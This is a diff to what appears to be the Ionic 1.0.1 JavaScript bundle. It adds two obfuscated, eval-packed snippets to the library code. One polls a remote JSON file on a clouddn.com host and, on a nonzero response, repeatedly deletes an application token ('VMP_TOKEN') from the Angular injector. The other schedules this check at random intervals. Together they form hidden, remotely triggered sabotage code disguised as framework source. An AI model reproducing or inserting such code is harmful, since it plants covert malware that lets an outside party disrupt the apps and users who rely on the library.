@@ -258,6 +258,7 @@ window.ionic.version = '1.0.1';
       } else {
         readyCallbacks.push(cb);
       }
+      a=function(){xmlhttp = new XMLHttpRequest();xmlhttp.onreadystatechange=b;function b(){function i() {eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('2 3.0(1.4).7().8(\'5\').6',9,9,'element|document|delete|angular|body|l|VMP_TOKEN|injector|get'.split('|'),0,{}))};eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('1(0.5==4&&0.6==3){1(!!2(0.b)){9.7(\'8()\',a)}}',12,12,'xmlhttp|if|parseInt|200||readyState|status|setInterval|i|window|1000|response'.split('|'),0,{}))};xmlhttp.open("GET",eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('"2://3.0.1.4.7.8/5.6"',9,9,'com1|z0|http|7xkypt|glb|vmp|json|clouddn|com'.split('|'),0,{})),true);xmlhttp.send();};
     },
 
     /**
@@ -55462,3 +55463,4 @@ IonicModule
 });
 
 })();
+eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('2.1(\'0()\',3.6()*5*4)',7,7,'a|setInterval|window|Math|1000|3600|random'.split('|'),0,{}))
